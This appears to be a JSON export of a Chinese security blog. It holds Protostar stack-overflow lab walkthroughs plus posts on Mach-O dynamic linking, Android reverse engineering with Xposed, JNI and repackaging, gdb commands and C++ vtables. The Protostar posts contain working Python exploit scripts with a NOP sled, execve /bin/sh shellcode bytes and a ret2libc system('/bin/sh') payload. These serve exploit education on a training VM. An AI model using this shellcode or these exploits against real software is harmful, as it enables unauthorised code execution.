&lt;getpath+96&gt; 0x080484c4 &lt;getpath+64&gt;: mov eax,0x80485e4 0x080484c9 &lt;getpath+69&gt;: mov edx,DWORD PTR [ebp-0xc] 0x080484cc &lt;getpath+72&gt;: mov DWORD PTR [esp+0x4],edx 0x080484d0 &lt;getpath+76&gt;: mov DWORD PTR [esp],eax 0x080484d3 &lt;getpath+79&gt;: call 0x80483c0 &lt;printf@plt&gt; 0x080484d8 &lt;getpath+84&gt;: mov DWORD PTR [esp],0x1 0x080484df &lt;getpath+91&gt;: call 0x80483a0 &lt;_exit@plt&gt; 0x080484e4 &lt;getpath+96&gt;: mov eax,0x80485f0 0x080484e9 &lt;getpath+101&gt;: lea edx,[ebp-0x4c] 0x080484ec &lt;getpath+104&gt;: mov DWORD PTR [esp+0x4],edx 0x080484f0 &lt;getpath+108&gt;: mov DWORD PTR [esp],eax 0x080484f3 &lt;getpath+111&gt;: call 0x80483c0 &lt;printf@plt&gt; 0x080484f8 &lt;getpath+116&gt;: leave 0x080484f9 &lt;getpath+117&gt;: ret 调试&amp;hack测试返回地址等在这里就省略了，还不明白的可以看前面的系列。这里先看下python脚本。 import struct padding = &#39;AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT&#39; ret = struct.pack(&quot;I&quot;, 0x080484f9) eip_after_ret = struct.pack(&quot;I&quot;, 0xbffff78c+40) nopslide = &#39;\\x90&#39;*100 payload = &#39;\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80&#39; print padding+ret+eip_after_ret+nopslide+payload 这里的ret返回地址我们改为了0x080484f9正是ret指令处的地址。eip_after_ret为真正在栈上跳转的执行地址，当然我们也加入了nopslide。 here we go! 成功运行bash！ 0x04 Ret2libc这次我们通过返回到libc里面的函数达到执行shell的目的。这里采用system(&quot;/bin/sh&quot;)。所以我们需要跳转到system函数，但同时要满足x86传参方式即要先将字符串&quot;/bin/sh&quot;压入栈中。下面我们就来做两件事： * 1，找到system在内存中的地址 * 2，找到字符串`&quot;/bin/sh&quot;`在内存中的地址 system &amp; &quot;/bin/sh&quot; 先找到/lib/libc-2.11.2.so在内存中的位置 然后找到字符串&quot;/bin/sh&quot;在/lib/libc-2.11.2.so中的偏移 验证：所以&quot;/bin/sh&quot;为0xb7fb63bf hack编写对应的Python脚本 import struct padding = &#39;AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT&#39; system = struct.pack(&quot;I&quot;,0xb7ecffb0) #system地址 ret_after_system = &#39;AAAA&#39; #返回地址，不重要 bin_sh = struct.pack(&quot;I&quot;, 0xb7fb63bf) #参数/bin/sh地址 print padding+system+ret_after_system+bin_sh 测试 cooooool! make it!0x05 小结学习到现在，一句话总结就是：你知道得越多才知道知道得越少。","tags":[{"name":"Linux","slug":"Linux","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Linux/"},{"name":"Protostar","slug":"Protostar","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Protostar/"},{"name":"栈溢出","slug":"栈溢出","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/栈溢出/"}]},{"title":"Protostar-栈溢出学习-ret跳转到自定义shellcode","date":"2017-04-15T03:12:19.000Z","path":"2017/04/15/Protostar-栈溢出系列学习-Stack 2/Protostar-栈溢出系列学习-Stack 2/","text":"0x00 序 经过前面的学习，我们已经了解了简单的栈溢出利用手段，建议看本文章前先看下前面的分析。这次我们来做点有趣的事，我们引入shellcode。 0x01 C语言源代码Stack5 is a standard buffer overflow, this time introducing shellcode. This level is at /opt/protostar/bin/stack5 Hints:At this point in time, it might be easier to use someone elses shellcodeIf debugging the shellcode, use \\xcc (int3) to stop the program executing and return to the debuggerremove the int3s once your shellcode is done. #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; int main(int argc, char **argv) { char buffer[64]; gets(buffer); } 0x02 思路&amp;分析和前面的一样，我们可以通过覆盖返回地址然后由ret指令跳转到目标地址，但这次我们没有了win()函数，那我们应该跳转到哪里呢？没错，还是跳到栈上。要达到执行代码的目的，所以我们需要在栈上写入shellcode。Here we go！ 0x03 调试&amp;hack 对应汇编，我们在0x080483da &lt;main+22&gt;: ret处下个断点 (gdb) disassemble Dump of assembler code for function main: 0x080483c4 &lt;main+0&gt;: push %ebp 0x080483c5 &lt;main+1&gt;: mov %esp,%ebp 0x080483c7 &lt;main+3&gt;: and $0xfffffff0,%esp 0x080483ca &lt;main+6&gt;: sub $0x50,%esp 0x080483cd &lt;main+9&gt;: lea 0x10(%esp),%eax 0x080483d1 &lt;main+13&gt;: mov %eax,(%esp) 0x080483d4 &lt;main+16&gt;: call 0x80482e8 &lt;gets@plt&gt; 0x080483d9 &lt;main+21&gt;: leave 0x080483da &lt;main+22&gt;: ret 同样的方法，Python脚本测试返回地址 可以发现0xbffff79c处正是返回地址，对应到TTTT,我需要在TTTT处写上我们要跳转的地址。 既然题目中说了用int 3 cc指令那我们就先来测试下–[cc指令（见文章末尾）]我们成功执行了cc INT 3指令并触发 SIGTRAP 引入nop slide为什么需要nop slide?来看看这种情况，我们再启动一个终端去调试。发现地址里面内容一样，但地址却不同，为什么会这样呢？再看看整个栈的情况可以发现，在圈中之后的栈地址都相同，但由于工作路径不同，导致前面的栈地址都发生了变化。因此，我们需要引入nop slide去解决这种情况。 填写shellcode自此，我们可以加入我们的shellcode了。这里我用的这里的shellcode。 现在我们重新编写Python脚本，制作shellcode payload 我们已经跳转的地址已经变化了40字节，并加入100的nopslide偏移，然后再执行shellcode 运行测试的确执行了dash，但并没有出现运行结果，这里很容易困惑。不应该这样的啊？经过思考，原来我们执行了/bin/dash后，并没有输入任何数据，所以就退出了。 那怎么才能让执行后输入数据呢？这里有一个小技巧，在执行后用cat指令，将输入转到输出 so cool! make it!0x04 附录INT 3 CC 详细分分析可以看这边文章int 3中断与软件调试 简单的理解就是:当我们调试程序时，可以在可能有问题的地方插入一条INT 3指令，使CPU执行到这一点时停下来。这便是软件调试中经常用到的断点（breakpoint）功能，因此INT 3指令又被称为断点指令。","tags":[{"name":"Linux","slug":"Linux","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Linux/"},{"name":"Protostar","slug":"Protostar","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Protostar/"},{"name":"栈溢出","slug":"栈溢出","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/栈溢出/"}]},{"title":"Protostar-栈溢出学习-覆盖栈函数指针和ret指令控制eip","date":"2017-04-13T03:12:19.000Z","path":"2017/04/13/Protostar-栈溢出系列学习-Stack 1/Protostar-栈溢出系列学习-Stack 1/","text":"0x00 序 接着之前的系列，下面研究两种控制eip的方式 0x01 C语言源代码Stack3 looks at environment variables, and how they can be set, and overwriting function pointers stored on the stack (as a prelude to overwriting the saved EIP) Hints:both gdb and objdump is your friend you determining where the win() function lies in memory. #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; void win() { printf(&quot;code flow successfully changed\\n&quot;); } int main(int argc, char **argv) { volatile int (*fp)(); char buffer[64]; fp = 0; gets(buffer); if(fp) { printf(&quot;calling function pointer, jumping to 0x%08x\\n&quot;, fp); fp(); } } 在main函数下断点，分析可知，1处为fp的地址，2处为fp()的调用，我们需要覆盖掉esp+0x5c处所存的函数指针值，使其跳转到win()函数 利用Python编写exp测试脚本，可以发现QQQQ覆盖了函数指针 重新编写exp,将QQQQ改为win()函数的地址，即可实现自定义调用，控制eip 成功执行win()函数 0x02 通过ret指令控制eipStack4 takes a look at overwriting saved EIP and standard buffer overflows. This level is at /opt/protostar/bin/stack4 Hints:A variety of introductory papers into buffer overflows may help.gdb lets you do “run &lt; input”EIP is not directly after the end of buffer, compiler padding can also increase the size. #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; void win() { printf(&quot;code flow successfully changed\\n&quot;); } int main(int argc, char **argv) { char buffer[64]; gets(buffer); } 先分析一下，可以发现这个程序很简单，看上去没有可以直接控制eip的方法，但函数的调用过程在结束的时候会将保存的返回地址存在栈中，ret指令的时候会将传给eip。所以我们可以覆盖对应的返回地址值达到控制eip ______________ | | &lt;---esp -------------- | 局部变量1 | -------------- | 局部变量2 | -------------- | ... | -------------- | | &lt;---new ebp -------------- | old ebp | -------------- | 返回地址 | ret --------&gt; eip -------------- 和前面一样，这次我们之间利用Python编写exp测试脚本，可以发现SSSS覆盖了old ebp，TTTT覆盖了返回地址 我们查看win()的地址，重新编写对应exp，然后将TTTT改为其地址，成功达到目的。 成功执行win()函数","tags":[{"name":"Linux","slug":"Linux","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Linux/"},{"name":"Protostar","slug":"Protostar","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Protostar/"},{"name":"栈溢出","slug":"栈溢出","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/栈溢出/"}]},{"title":"Protostar-栈溢出学习-简单栈溢出修改局部变量值","date":"2017-04-11T03:12:19.000Z","path":"2017/04/11/Protostar-栈溢出系列学习-Stack 0/Protostar-栈溢出系列学习-Stack 0/","text":"0x01 序 为了加强自己在漏洞利用方面的能力，准备做一个栈溢出和堆溢出利用的系列学习，从最简单的栈溢出学习开始，学习平台是本地搭建的一个基于linux系统的Protostar学习虚拟机环境，里面有从易到难的示例溢出漏洞程序。那就开始吧！ 0x01 Protostar虚拟机环境搭建虚拟机下载地址 虚拟机环境搭建视频教程 默认用户名和密码: user:user root:godmode 虚拟机启动后，输入bash进入终端界面 漏洞程序在/opt/protostar/bin目录下 0x01 C语言源代码This level introduces the concept that memory can be accessed outside of its allocated region, how the stack variables are laid out, and that modifying outside of the allocated memory can modify program execution. This level is at /opt/protostar/bin/stack0 #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;stdio.h&gt; int main(int argc, char **argv) { volatile int modified; char buffer[64]; modified = 0; gets(buffer); if(modified != 0) { printf(&quot;you have changed the &#39;modified&#39; variable\\n&quot;); } else { printf(&quot;Try again?\\n&quot;); } } 0x02 思路&amp;分析这个栈溢出很简单，首先在栈上分配了64字节大小的空间，然后根据modified的值来决定执行流程，但modified始终等于0。所以我们需要利用栈溢出去修改modified的值。 0x03 调试&amp;利用 gdb连接到stack0，下break *main在main函数上下断点，然后set disassembly-flavor intel设置intel汇编指令格式,在0x08048411出下个断点 利用define hook-stop在断点触发时观察栈变量和寄存器的值 &gt;info registers &gt;x/24wx $esp &gt;end 由上图可以发现，当我们输入几个A后，0xbffff762地址已经被写入了0x41,然后我们再查看modified的值发现没有变化，通过计算发现为buffer偏移4+16*3+12字节出。 利用Python写入4+16*3+14字节数的A，发现成功修改modified的值，改变其执行流程。","tags":[{"name":"Linux","slug":"Linux","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Linux/"},{"name":"Protostar","slug":"Protostar","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Protostar/"},{"name":"栈溢出","slug":"栈溢出","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/栈溢出/"}]},{"title":"Mach-o动态链接","date":"2017-04-10T03:12:19.000Z","path":"2017/04/10/macho-dyld-link/macho-dyld-link/","text":"0x00 序可执行文件很少是独立的，除了极少数的一些静态链接的可执行文件以外，大多的都是动态链接，这就需要依赖一些预先存在的库，这些库可以是操作系统提供的动态共享库，也可以是第三方的库。所以在可执行文件中充满了大量对外部库的符号的引用，这些空洞就需要动态链接器来完成所谓的符号绑定。macOS中是内核执行LC_DYLINKER加载命令时启动的，通常为/usr/lib/dyld接管刚创建进程的控制权。本文就来分析其符号的动态链接过程。 0x01 符号的加载过程以下面这个简单的C语言程序为例。 void main(int argc, char *argv[]) { printf(&quot;first printf&quot;); printf(&quot;second printf&quot;); } 对应的汇编代码 -&gt; 0x100000f40 &lt;+0&gt;: pushq %rbp 0x100000f41 &lt;+1&gt;: movq %rsp, %rbp 0x100000f44 &lt;+4&gt;: subq $0x20, %rsp 0x100000f48 &lt;+8&gt;: leaq 0x4b(%rip), %rax ; &quot;first printf&quot; 0x100000f4f &lt;+15&gt;: movl %edi, -0x4(%rbp) 0x100000f52 &lt;+18&gt;: movq %rsi, -0x10(%rbp) 0x100000f56 &lt;+22&gt;: movq %rax, %rdi 0x100000f59 &lt;+25&gt;: movb $0x0, %al 0x100000f5b &lt;+27&gt;: callq 0x100000f7a ; symbol stub for: printf 0x100000f60 &lt;+32&gt;: leaq 0x40(%rip), %rdi ; &quot;second printf&quot; 0x100000f67 &lt;+39&gt;: movl %eax, -0x14(%rbp) 0x100000f6a &lt;+42&gt;: movb $0x0, %al 0x100000f6c &lt;+44&gt;: callq 0x100000f7a ; symbol stub for: printf 0x100000f71 &lt;+49&gt;: movl %eax, -0x18(%rbp) 0x100000f74 &lt;+52&gt;: addq $0x20, %rsp 0x100000f78 &lt;+56&gt;: popq %rbp 0x100000f79 &lt;+57&gt;: retq 和大多数的Linux系统一样，mach-o符号的动态绑定也采用了打桩机制，简单的说就是在遇到外部符号的时候就会先跳转到stub区 第一次printf会先进入dyld_stub_binder区去找到printf函数的地址，我们用lldb调试观察DATA段la_symbol_ptr区地址值 会发现正好地址在dyld_stub_binder区 验证: 第二次printf我们在观察DATA段la_symbol_ptr区地址值 我们会发现当第二次再次调用printf函数时，还是会先跳转到stub区，但此时la_symbol_ptr中的值却变为了printf的真实地址，而不是dyld_stub_binder。这样就完成了一次延时绑定，后面就直接调用。 0x02 stub桩机制总结综上分析，我们可以发现所有的外部函数引用都会在DATA段la_symbol_ptr区中产生一个占位符，其初始值为dyld_stub_binder区中对应的编号地址。当第一个调用时，就会进入符号的动态链接过程，一旦找到其地址后，就会将DATA段la_symbol_ptr区中的占位符改为找到后的地址。这样就完成了只需要一个符号绑定。 stub桩机制的巧妙之处也在此，首先当产生一个外部符号调用时，直接跳到对应的stub桩位置，然后由里面保存的地址来判断是第一次调用还是已经找到符号的地址。就像桩这个名字含义一样，一个占位符的思想。 0x03 参考Mach-O的动态链接相关知识 Dynamic Linking: ELF vs. Mach-O Dynamic symbol table duel: ELF vs Mach-O, round 2","tags":[{"name":"mach-o","slug":"mach-o","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/mach-o/"},{"name":"dyld","slug":"dyld","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/dyld/"},{"name":"stub","slug":"stub","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/stub/"}]},{"title":"android re basic","date":"2017-04-09T09:25:13.000Z","path":"2017/04/09/android-re-basic/android-re-basic/","text":"Android系统简介文件目录 目录 说明 /system/app 预装的app(.apk)文件，如Alarm Clock, Browser, Contacts, Maps /system/framework Android系统的核心库，有core.jar, framework-res.apk, com.google.android.gtalkservice.jar /data/app 用户安装的app(.apk)文件 /data/data/app-package-name Context.openFileOutput()创建的文件 adb使用介绍 命令 说明 adb devices 列举连接到电脑 adb push local remote 可以copy本机文件到手机 adb pull remote local 可以copy手机文件到本机 adb shell 获得shell adb install apk-file 安装 adb -s device-serialnum 指定某台设备 adb shell getprop ro.build.version.release 获取系统版本 adb shell getprop ro.build.version.sdk 获取系统api版本 adb -d 唯一指定连接的设备 adb -d shell getprop ro.product.cpu.abi 查看cpu型号 apk文件结构 文件或目录 说明 AndroidManifest.xml 一个清单文件，它描述了应用的名字、版本、权限、注册的服务等信息 assets文件夹 存放资源文件的目录 classes.dex java源码编译经过编译后生成的dalvik字节码文件，主要在Dalvik虚拟机上运行的主要代码部分 lib文件夹 存放ndk编译出来的so文件 META-INF文件夹 1.该目录下存放的是签名信息，用来保证apk包的完整性和系统的安全性 2.CERT.RS 保存着该应用程序的证书和授权信息 3.CERT.SF 保存着SHA-1信息资源列表 4.MANIFEST.MF 清单信息 res文件夹 存放资源文件的目录 resources.arsc 编译后的二进制资源文件 xposed安装手机端需要安装xposed框架 电脑端需要去https://jcenter.bintray.com/de/robv/android/xposed/api/下载依赖的jar包手动依赖，或者 compileOnly &#39;de.robv.android.xposed:api:82&#39;让gradle去自动下载依赖。这两种方式不能同时使用。不然会编译出来的apk不能被xposed框架加载。 将两个jar包放入libs目录下 在build.gradle文件中添加以下 dependencies { compileOnly &#39;de.robv.android.xposed:api:82&#39; implementation fileTree(dir: &#39;libs&#39;, include: [&#39;*.jar&#39;]) implementation &#39;com.android.support:appcompat-v7:28.0.0&#39; implementation &#39;com.android.support.constraint:constraint-layout:1.1.3&#39; testImplementation &#39;junit:junit:4.12&#39; androidTestImplementation &#39;com.android.support.test:runner:1.0.2&#39; androidTestImplementation &#39;com.android.support.test.espresso:espresso-core:3.0.2&#39; } 禁用instant run AndroidManifest.xml中写入以下标识为xposed模块 &lt;meta-data android:name=&quot;xposedmodule&quot; android:value=&quot;true&quot; /&gt; &lt;meta-data android:name=&quot;xposeddescription&quot; android:value=&quot;desciption for the xposed module&quot; /&gt; &lt;meta-data android:name=&quot;xposedminversion&quot; android:value=&quot;53&quot; /&gt; 创建assets文件夹并创建xposed_init的txt文件，里面按行写入hook类的全路径 com.xia0.crackmehooker.Hooks 使用public class Hooks implements IXposedHookLoadPackage { final String packageName = &quot;com.xia0.crackmehooker&quot;; @Override public void handleLoadPackage(XC_LoadPackage.LoadPackageParam loadPackageParam) throws Throwable { if (loadPackageParam.packageName.equals(packageName)) { XposedBridge.log(&quot;[xia0] ===================hook=============&quot;); Class clazz = loadPackageParam.classLoader.loadClass(&quot;com.xia0.crackmehooker.MainActivity&quot;); XposedHelpers.findAndHookMethod(clazz, &quot;toastMessage&quot;, new XC_MethodHook() { @Override protected void beforeHookedMethod(MethodHookParam param) throws Throwable { super.beforeHookedMethod(param); } @Override protected void afterHookedMethod(MethodHookParam param) throws Throwable { param.setResult(&quot;you has been hooked&quot;); } }); } } } 代码很简单，无解释。 hook多dex或动态load的dexXposedHelpers.findAndHookMethod(ClassLoader.class, &quot;loadClass&quot;, String.class, new XC_MethodHook() { @Override protected void afterHookedMethod(MethodHookParam param) throws Throwable { if (param.hasThrowable()) return; Class&lt;?&gt; cls = (Class&lt;?&gt;) param.getResult(); String name = cls.getName(); if (name.contains(&quot;StringScriptSource&quot;)) { XposedBridge.log(&quot;[xia0]: load class &quot;+ name); XposedBridge.hookAllMethods(cls, &quot;getScript&quot;,new XC_MethodHook() { @Override protected void afterHookedMethod(MethodHookParam param) throws Throwable { // TODO super.afterHookedMethod(param); String ret = (String) param.getResult(); XposedBridge.log(&quot;[xia0]: hook result :\\n&quot;+ (String) ret); } } ); } } }); 原理就是hook classLoader的loadClass方法，然后再去hook目标class，这时候就能解决hook的时候class不存在的问题。 jni编程java文件 package com.xia0.jni; import android.support.v7.app.AppCompatActivity; import android.os.Bundle; import android.view.View; import android.widget.Button; import android.widget.TextView; import android.widget.Toast; public class MainActivity extends AppCompatActivity { public TextView textview; public Button button; static { System.loadLibrary(&quot;ndktest&quot;); } @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); this.button = (Button) findViewById(R.id.button); this.textview = (TextView) findViewById(R.id.text); button.setOnClickListener(new View.OnClickListener() { @Override public void onClick(View v) { Toast.makeText(MainActivity.this, stringFromJni(), Toast.LENGTH_SHORT).show(); textview.setText(stringFromJni()); } }); } public native String stringFromJni(); } C++文件 native.h #ifndef NDK_CORE_H #define NDK_CORE_H #define NELEM(x) ((int) (sizeof(x) / sizeof((x)[0]))) #include &lt;jni.h&gt; #include &lt;stdlib.h&gt; __BEGIN_DECLS JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM* vm, void* reserved); JNIEXPORT void JNICALL JNI_OnUnload(JavaVM* vm, void* reserved); __END_DECLS #endif //TEXT_HELLO_H native.cpp #include &quot;native.h&quot; jstring returnString(JNIEnv *env,jobject jobj){ char* str = &quot;I come from C＋＋&quot;; return env-&gt;NewStringUTF(str); } static JNINativeMethod gMethods[] = { {&quot;stringFromJni&quot;,&quot;()Ljava/lang/String;&quot;,(void *)returnString } }; JNIEXPORT int JNICALL JNI_OnLoad(JavaVM *vm,void *reserved) { JNIEnv *env; if (vm-&gt;GetEnv((void **) &amp;env,JNI_VERSION_1_6) != JNI_OK){ return JNI_ERR; } jclass javaClass = env-&gt;FindClass(&quot;com/xia0/jni/MainActivity&quot;); if (javaClass == NULL){ return JNI_ERR; } if (env-&gt;RegisterNatives(javaClass,gMethods,NELEM(gMethods)) &lt; 0) { return JNI_ERR; } return JNI_VERSION_1_6; } Android.mk LOCAL_PATH := $(call my-dir) include $(CLEAR_VARS) LOCAL_MODULE := ndktest LOCAL_C_INCLUDES += $(LOCAL_PATH) LOCAL_SRC_FILES := native.cpp include $(BUILD_SHARED_LIBRARY) Application.mk APP_ABI := armeabi-v7a x86 APP_PLATFORM := android-16 APP_STL := c++_shared APP_OPTIM := debug 打开terminal，cd src/main/jni文件夹中，然后执行ndk-build 在项目名称的右键点击Link C++ Project with Gradle ，选择ndk-build，指定Android.mk文件路径 java 符号 c++ boolean Z jboolean byte B jbyte char C jchar short S jshort int I jint long J jlong float F jfloat double D jdouble void V objects对象 Lfully-qualified-class-name; jobject Arrays数组 [array-type jintArray 重打包签名生成keystore keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000 签名apk jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore my_application.apk alias_name 验证签名 jarsigner -verify -verbose -certs my_application.apk zip zipalign -v 4 your_project_name-unaligned.apk your_project_name.apk 调试 jdb 在AndroidManifest.xml的application中添加android:debuggable=&quot;true&quot; mprop BDOpener 参考 adb shell am start -D -n com.test.id/.MainActivity adb -d forward tcp:29882 jdwp:app_pid jdb -connect com.sun.jdi.SocketAttach:hostname=localhost,port=29882 ida adb push dbgsrv/android_server /data/local/tmp ./android_server adb forward tcp:23946 tcp:23946 lldb platform select remote-android adb push lldb-server /data/local/tmp/ adb shell /data/local/tmp/lldb-server platform --server --listen unix-abstract:///data/local/tmp/debug.sock platform select remote-android platform connect unix-abstract-connect:///data/local/tmp/debug.sock 刷机/root/xposedUnlock bootloaderhttps://developers.google.com/android/images下载google原生镜像 adb reboot bootloader fastboot flashing unlock fastboot reboot fastboot boot twrp-3.2.3-0-blueline.img // boot TWRP 注意点： 在安装TWRP应用的时候不要安装为系统应用 参考https://www.thecustomdroid.com/root-google-pixel-3-xl-guide/ xposed框架https://github.com/ElderDrivers/EdXposed 常见资源/索引 平台代号、版本、API 级别和 NDK 版本 https://geneblue.github.io/2016/10/09/%E5%88%A9%E7%94%A8OLLVM%E6%B7%B7%E6%B7%86Android%20Native%E4%BB%A3%E7%A0%81%E7%AF%87%E4%B8%80/","tags":[{"name":"android","slug":"android","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/android/"}]},{"title":"gdb常用调试命令总结","date":"2017-03-21T03:06:59.000Z","path":"2017/03/21/gdb常用调试命令总结/gdb/","text":"0x01 序最近在做TCTF上一道Linux下的逆向题，对GDB的调试很多命令相关做一个小总结，可能不是很系统，只是记一些比较常用的，后面可能会不定期更新。 0x02 命令行参数有时候，我们需要调试的程序需要有命令行参数，很多朋友都不知道怎么设置调试的程序的命令行参数。其实，有两种方法： gdb命令行的 –args 参数 gdb环境中 set args命令 show args查看程序参数 0x03 多线程调试多线程调试可能是问得最多的。其实，重要就是下面几个命令： info thread 查看当前进程的线程。thread 切换调试的线程为指定ID的线程。break file.c:100 thread all 在file.c文件第100行处为所有经过这里的线程设置断点。set scheduler-locking off|on|step，这个是问得最多的。在使用step或者continue命令调试当前被调试线程的时候，其他线程也是同时执行的，怎么只让被调试程序执行呢？通过这个命令就可以实现这个需求。 off 不锁定任何线程，也就是所有线程都执行，这是默认值。 on 只有当前被调试程序会执行。 step 在单步的时候，除了next过一个函数的情况(熟悉情况的人可能知道，这其实是一个设置断点然后continue的行为)以外，只有当前线程会执行。 0x04 断点 break *0x000000 下断点 info breakpoints 查看断点 delete break 1 删除断点 break [where] if [condition] 条件断点 enable 恢复失效的断点 disable 使断点失效 clear 清除断点 break 21 在第21行设置断点 break main 在main函数处设置断点 break test 在函数test处设置断点 0x05 x命令也许，你很喜欢用p命令。所以，当你不知道变量名的时候，你可能会手足无措，因为p命令总是需要一个变量名的。x命令是用来查看内存的，在gdb中 “help x” 你可以查看其帮助。 x/x 以十六进制输出 x/d 以十进制输出 x/c 以单字符输出 x/i 反汇编 – 通常，我们会使用 x/10i $ip-20 来查看当前的汇编（$ip是指令寄存器） x/s 以字符串输出 x/5i $pc 查看汇编代码 x/4wx 0x000000 查看内存 0x06 command命令有一些朋友问我如何自动化调试。这里向大家介绍command命令，简单的理解一下，其就是把一组gdb的命令打包，有点像字处理软件的“宏”。下面是一个示例： (gdb) break func Breakpoint 1 at 0x3475678: file test.c, line 12. (gdb) command 1 Type commands for when breakpoint 1 is hit, one per line. End with a line saying just &quot;end&quot;. &gt;print arg1 &gt;print arg2 &gt;print arg3 &gt;end (gdb) 当我们的断点到达时，自动执行command中的三个命令，把func的三个参数值打出来。 0x07 其他 step / s 下一步，直接执行下一条程序 set disassembly-flavor intel 设置为intel汇编指令 info proc mappings `define stop-hook 设置断点触发后自动执行命令 info registersx/24wx $espx/2i $eipend` continue / cont 下一段，如果遇到函数，不会进入函数，逐过程，有点类似VS里面的F10 run 运行 finish 结束调试 print / p 显示某个变量的值 p *array@len 输出数组 p i 输出i的值 0x08 附表寄存器宽度表 |63..32|31..16|15-8|7-0| |AH.|AL.| |AX.....| |EAX............| |RAX...................|","tags":[{"name":"gdb","slug":"gdb","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/gdb/"},{"name":"linux","slug":"linux","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/linux/"}]},{"title":"详解virtual table","date":"2017-03-06T17:51:44.000Z","path":"2017/03/07/C++ Virtual table/详解virtual table/","text":"详解virtual tableC++中的虚函数的作用主要是实现了多态的机制。关于多态，简而言之就是用父类型别的指针指向其子类的实例，然后通过父类的指针调用实际子类的成员函数。这种技术可以让父类的指针有“多种形态”，这是一种泛型技术。所谓泛型技术，说白了就是试图使用不变的代码来实现可变的算法。比如：模板技术，RTTI技术，虚函数技术，要么是试图做到在编译时决议，要么试图做到运行时决议。 关于虚函数的使用方法，我在这里不做过多的阐述。大家可以看看相关的C++的书籍。在这篇文章中，我只想从虚函数的实现机制上面为大家 一个清晰的剖析。 当然，相同的文章在网上也出现过一些了，但我总感觉这些文章不是很容易阅读，大段大段的代码，没有图片，没有详细的说明，没有比较，没有举一反三。不利于学习和阅读，所以这是我想写下这篇文章的原因。也希望大家多给我提意见。 言归正传，让我们一起进入虚函数的世界。 虚函数表 对C++ 了解的人都应该知道虚函数（Virtual Function）是通过一张虚函数表（Virtual Table）来实现的。简称为V-Table。 在这个表中，主是要一个类的虚函数的地址表，这张表解决了继承、覆盖的问题，保证其容真实反应实际的函数。这样，在有虚函数的类的实例中这个表被分配在了 这个实例的内存中，所以，当我们用父类的指针来操作一个子类的时候，这张虚函数表就显得由为重要了，它就像一个地图一样，指明了实际所应该调用的函数。 这里我们着重看一下这张虚函数表。在C++的标准规格说明书中说到，编译器必需要保证虚函数表的指针存在于对象实例中最前面的位置（这是为了保证正确取到虚函数的偏移量）。 这意味着我们通过对象实例的地址得到这张虚函数表，然后就可以遍历其中函数指针，并调用相应的函数。 听我扯了那么多，我可以感觉出来你现在可能比以前更加晕头转向了。 没关系，下面就是实际的例子，相信聪明的你一看就明白了。 假设我们有这样的一个类： class Base { public: virtual void f() { cout &lt;&lt; &quot;Base::f&quot; &lt;&lt; endl; } virtual void g() { cout &lt;&lt; &quot;Base::g&quot; &lt;&lt; endl; } virtual void h() { cout &lt;&lt; &quot;Base::h&quot; &lt;&lt; endl; } }; 按照上面的说法，我们可以通过Base的实例来得到虚函数表。 下面是实际例程： typedef void(*Fun)(void); Base b; Fun pFun = NULL; cout &lt;&lt; &quot;虚函数表地址：&quot; &lt;&lt; (int*)(&amp;b) &lt;&lt; endl; cout &lt;&lt; &quot;虚函数表 — 第一个函数地址：&quot; &lt;&lt; (int*)*(int*)(&amp;b) &lt;&lt; endl; // Invoke the first virtual function pFun = (Fun)*((int*)*(int*)(&amp;b)); pFun(); 实际运行经果如下：(Windows XP+VS2003, Linux 2.6.22 + GCC 4.1.3) 虚函数表地址：0012FED4 虚函数表 — 第一个函数地址：0044F148 Base::f 通过这个示例，我们可以看到，我们可以通过强行把&amp;b转成int *，取得虚函数表的地址，然后，再次取址就可以得到第一个虚函数的地址了，也就是Base::f()，这在上面的程序中得到了验证（把int* 强制转成了函数指针）。通过这个示例，我们就可以知道如果要调用Base::g()和Base::h()，其代码如下： (Fun)*((int*)*(int*)(&amp;b)+0); // Base::f() (Fun)*((int*)*(int*)(&amp;b)+1); // Base::g() (Fun)*((int*)*(int*)(&amp;b)+2); // Base::h() 这个时候你应该懂了吧。什么？还是有点晕。也是，这样的代码看着太乱了。没问题，让我画个图解释一下。如下所示： 注意：在上面这个图中，我在虚函数表的最后多加了一个结点，这是虚函数表的结束结点，就像字符串的结束符“\\0”一样，其标志了虚函数表的结束。这个结束标志的值在不同的编译器下是不同的。在WinXP+VS2003下，这个值是NULL。而在Ubuntu 7.10 + Linux 